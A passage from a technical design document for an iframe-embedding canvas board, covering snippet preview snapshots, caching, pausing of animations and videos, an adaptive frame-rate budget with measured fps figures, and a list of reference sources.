- **Job**: load (srcdoc reset on a reused frame), wait 400 ms so it animates into a representative state, request a snapshot (same protocol as freezing, with `vw` / `vh`), draw it in the parent at the frozen-snapshot size, make it the poster. Time box 4 s (3 s for the drawing). A failure keeps the tile and is tried once more, after every other card.
- **Why not off screen**: Chromium throttles frames outside the viewport, and a throttled cross-origin frame runs no `requestAnimationFrame`, so canvas snippets would be blank. Measured in Chromium: a frame at `left:0; opacity:0` ran rAF at ~110 fps, the same frame at `left:-9999px` stalled at 9 frames.
- **Precedence**: a live frame's snapshot replaces a preview; a preview never replaces a snapshot, and a tile (late, retitled, or from a theme change) never replaces a preview.
- **Cache**: keyed by html + aspect bucket + resolution + picture size. An in-memory LRU (400 blobs, per page, FNV-1a 64 bit) shared by the layer, so the same snippet on two cards is drawn once; and in Cache Storage (`corkboard-previews-v2` or the configured name, synthetic URLs `/__corkboard_preview/<sha256 hex>`) with `'persistent'`, where a hit applies on track without loading anything. The persistent key is a SHA-256 (`crypto.subtle`): where that is missing (an insecure context), or Cache Storage is, the store stays in memory. Opening the default cache deletes the `-v1` one, whose entries used another hash. `clearPreviewCache(name?)` deletes the entry on demand. Feature-detected and try/caught (private mode, `file://`): falls back to memory. Nothing else is stored. Cache Storage is capped at 1000 entries (`PREVIEW_PERSIST_MAX`): on open, and whenever the page has written past it, the oldest are deleted in the order `Cache.keys()` returns them, which is insertion order in Chromium (the cap holds elsewhere, but what goes first is not guaranteed).
- `board.stats().embeds.previewsPending` is the queue length plus jobs in progress (checking the cache, waiting, rendering).
- Limits: same as snapshots (network images blank, WebGL without `preserveDrawingBuffer` blank). A snippet that is time-dependent is previewed once, 400 ms in.

### Pausing and the adaptive budget

- Snippets: `{ op: 'pause' | 'resume' }`. The bootstrap pauses `document.getAnimations()` and holds `requestAnimationFrame`, `setTimeout` and `setInterval` callbacks that fall due, until resume (a timeout runs on resume, an interval once and then on its own schedule; the ids it returns are the bootstrap's own and work with both clears).
- YouTube (`enablejsapi=1`) and Vimeo: `pauseVideo` / `playVideo` via `postMessage`, re-sent 1.5 s after load because the first command can be lost. A video is played again only if autoplay is on or the user started it.
- Pages without a control channel (Wikipedia, generic URLs, Spotify, CodePen, Figma) can be neither paused nor snapshotted: they stay live while in view.
- Frame-rate monitor (`src/render/frameRate.ts`, one per board, shared by the embed layer and the video pool): measures fps over 1 s windows, but **in bursts**, not in a loop that keeps the page awake. A burst starts (or is extended: its count starts over) on anything that can change the load: the camera settled, frames mounted / destroyed / culled / frozen / thawed, a budget or option moved, the video pool changed, the tab became visible. It also starts every 10 s as a heartbeat while any consumer has something rendering. It ends after 4 counted windows, or as soon as 2 in a row agree (slow, smooth or neither), then no rAF is pending. The first window of an event-started burst is discarded (frames are mounting), as is the one after a stall (hidden page). Consumers subscribe to each window (`slow` under 40 fps, `smooth` over 55, scaled to the display) and say whether they have anything to measure.
- Adaptive budget: on each window from the monitor. Under 40 fps the number of animating frames drops to 70% (never below 6). After 2 windows over 55 fps it grows by a quarter, and the cap is lifted once it covers everything. **Freeze size**: hiding frames is the biggest lever (hiding all of them took the 1000-windows demo from 30 to 120 fps), so when the budget is already at its floor and a window is still slow, `freezePx` is multiplied by 1.5 (up to 4×); every pair of smooth windows divides it back (down to `freezePx`). `freezeThreshold` is the size in force; the demo shows it as "Freeze < N px". The thresholds scale down on slower displays (a 30 Hz screen is judged against 30 Hz) but never up. Priority: interacting, selected, biggest on screen, nearest the centre.
- Videos share the budget. The always-playing pool (`video.mode: 'always'`) subscribes to the same monitor: a slow window cuts its cap to 60% of the clips that play (at least 1, the biggest and most central keep playing, the pool already ranks), a pair of smooth ones in a row gives back 50% (rounded up) until `maxPlaying`. Measured: any 8 `<video>` elements can halve the frame rate on their own (table below). `board.video.budget` is the cap in force; the demo shows it as "Videos playing: N/cap". Both consumers react to the same window, so on a page that has both, both shed load; the next window shows the effect.

### No white flash

The wrapper is transparent once the frame has loaded (`data-ready`; before that it is a dark veil with a spinner), so the WebGL poster underneath shows until the frame paints: a frame coming back from culled or frozen, or loading for the first time, never flashes a white box. A snippet without a background of its own gets white inside its own document, from the bootstrap (a colour or image on the root or the body wins), so it does not show the poster through itself once it has painted.

### Measured (1000-windows demo, Chromium, 120 Hz display)

| Case | fps |
|---|---|
| Light page | 120 |
| ~550 live frames, no freezing or pausing, board videos off | 30 |
| Same, with freezing and pausing (≈440 frozen) | 53 |
| All frames hidden, board videos off | 120 |
| Any 8 playing `<video>` elements, even tiny and outside the board | 30 |

Our own main-thread work shows no long tasks: the cost is in the frames and the video decoders. WebGPU would not change these numbers, because the board's WebGL draw is not the bottleneck and no GPU API can read a cross-origin frame's pixels.

## Sources

- WICG explainer: https://github.com/WICG/html-in-canvas; draft spec: https://wicg.github.io/html-in-canvas/
- Chrome OT post, changes, and Intent to Experiment: https://developer.chrome.com/blog/html-in-canvas-origin-trial, https://developer.chrome.com/blog/html-in-canvas-ot-changes, https://groups.google.com/a/chromium.org/g/blink-dev/c/t_nGEmJ_v4s
- tldraw: https://tldraw.dev/sdk-features/embed-shape, https://tldraw.dev/examples/persistent-iframe-shape
- Excalidraw source: https://github.com/excalidraw/excalidraw/blob/master/packages/excalidraw/components/App.tsx; CVE: https://security-tracker.debian.org/tracker/CVE-2024-32472
- FigJam EmbedData: https://developers.figma.com/docs/plugins/api/EmbedData; Figma oEmbed: https://developers.figma.com/docs/rest-api/oembed-endpoints/
- oEmbed spec: https://oembed.com/
- Cloudflare Browser Rendering: https://developers.cloudflare.com/browser-rendering/rest-api/screenshot-endpoint/, https://developers.cloudflare.com/browser-rendering/limits/
- Iframe `credentialless`: https://developer.chrome.com/blog/iframe-credentialless; CSP sandbox: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox
- OOPIFs: https://chromium.org/developers/design-documents/oop-iframes; lazy loading: https://blog.chromium.org/2019/10/automatically-lazy-loading-offscreen.html
- Meta oEmbed state: https://feedframer.com/guides/instagram-post-embed, https://wpmayor.com/meta-tokenless-oembed-wordpress/
